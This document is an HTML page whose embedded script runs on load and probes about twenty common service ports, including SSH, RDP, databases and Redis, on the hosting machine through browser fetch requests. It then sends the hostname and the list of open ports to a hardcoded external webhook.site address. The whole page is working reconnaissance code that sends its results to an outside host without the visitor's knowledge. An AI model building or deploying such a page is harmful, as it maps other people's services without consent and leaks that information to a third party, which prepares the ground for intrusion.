<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Port Scanner</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0d1117; color: #c9d1d9; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; }
        h1 { color: #58a6ff; }
        .log { background: #0d1117; border: 1px solid #30363d; border-radius: 4px; padding: 15px; margin: 15px 0; max-height: 600px; overflow-y: auto; font-size: 12px; }
        .entry { margin: 5px 0; padding: 5px; border-left: 3px solid #30363d; padding-left: 10px; }
        .open { border-left-color: #3fb950; color: #3fb950; }
        .closed { border-left-color: #f85149; color: #f85149; }
        .info { border-left-color: #58a6ff; color: #58a6ff; }
        .webhook { border-left-color: #d29922; color: #d29922; }
        .status { margin: 10px 0; padding: 10px; background: #0d1117; border: 1px solid #30363d; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔍 Port Scanner - Auto Run</h1>
        <div class="status">
            <strong>Target:</strong> <span id="target">localhost</span> | 
            <strong>Status:</strong> <span id="status">Starting scan...</span>
        </div>
        <div id="log" class="log">Initializing scanner...</div>
    </div>

    <script>
        const webhookUrl = 'https://webhook.site/4eb0eaf7-b3a6-47d2-85c8-c47759291f94';
        const commonPorts = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 5984, 8080, 8443, 27017, 6379, 9200];

        function addLog(message, type = 'info') {
            const timestamp = new Date().toLocaleTimeString();
            const entry = `[${timestamp}] ${message}`;
            
            const logDiv = document.getElementById('log');
            const entryEl = document.createElement('div');
            entryEl.className = `entry ${type}`;
            entryEl.textContent = entry;
            logDiv.appendChild(entryEl);
            logDiv.scrollTop = logDiv.scrollHeight;
        }

        async function sendToWebhook(data) {
            try {
                const payload = {
                    timestamp: new Date().toISOString(),
                    scanType: 'port_scan',
                    data: data
                };
                
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                addLog(`📨 Webhook Response: ${response.status} ${response.statusText}`, 'webhook');
            } catch (error) {
                addLog(`❌ Webhook Failed: ${error.message}`, 'closed');
            }
        }

        async function runScan() {
            const hostname = window.location.hostname || 'localhost';
            document.getElementById('target').textContent = hostname;
            addLog(`🎯 Target: ${hostname}`, 'info');
            addLog(`📊 Scanning ${commonPorts.length} ports...`, 'info');
            
            let openPorts = [];
            let results = {};

            for (const port of commonPorts) {
                try {
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 1500);
                    
                    const response = await fetch(`http://${hostname}:${port}`, {
                        method: 'HEAD',
                        signal: controller.signal
                    }).catch(() => null);
                    
                    clearTimeout(timeoutId);
                    
                    if (response) {
                        openPorts.push(port);
                        results[port] = 'OPEN';
                        addLog(`✅ Port ${port} OPEN`, 'open');
                    } else {
                        results[port] = 'CLOSED';
                    }
                } catch (error) {
                    results[port] = 'CLOSED';
                }
            }

            addLog(`\n🏁 Found ${openPorts.length} open ports`, 'info');
            
            await sendToWebhook({
                hostname: hostname,
                openPorts: openPorts,
                totalScanned: commonPorts.length,
                closedPorts: commonPorts.length - openPorts.length
            });

            document.getElementById('status').textContent = 'Complete ✅';
        }

        window.addEventListener('load', runScan);
    </script>
</body>
</html>
